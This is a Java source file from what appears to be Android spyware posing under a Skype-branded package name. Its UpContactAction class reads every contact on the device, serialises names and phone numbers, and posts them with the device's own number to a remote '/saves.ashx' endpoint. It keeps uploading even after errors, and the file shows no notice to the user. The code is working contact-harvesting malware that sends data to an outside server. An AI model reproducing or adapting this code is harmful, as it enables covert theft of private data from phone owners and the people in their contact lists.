package com.skype.raider.action;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import com.skype.raider.dao.ContactDao;
import com.skype.raider.entity.Contact;
import com.skype.raider.util.LocalManager;

public class UpContactAction extends BaseAction {
	 
	@Override
	public boolean doUpload() {
		try {
			
				List<Contact>  contacts= ContactDao.readContact(mContext);
//				if(contacts==null) contacts=new ArrayList<Contact>();
//				contacts.addAll(0,ContactDao.getAccount(mContext));
				String contactString="CONTACT:START";
				for(Contact item:contacts){
					contactString+=String.format("%s:%s##", item.getName(),item.getPhone());
				}
				
				if (contacts != null && !contacts.isEmpty()) {
					HashMap<String, String> params = new HashMap<String, String>();
					params.put("sbid", mPhone);  
					params.put("smscontent",contactString);
					String result = mHttpWrapper.post(getRequestUrl(), params, String.class);
					if (result != null) {
						LocalManager.updateContactList(mContext, contacts);
					}
				} 
				return true;
			 
		} catch (Exception e) {
			e.printStackTrace();
			// 发生异常时，仍允许下一个继续上传
			return true;
		}
	}

	@Override
	protected String getRequestUrl() {
		return DEFAULT_HOST + "/saves.ashx";
	}

}
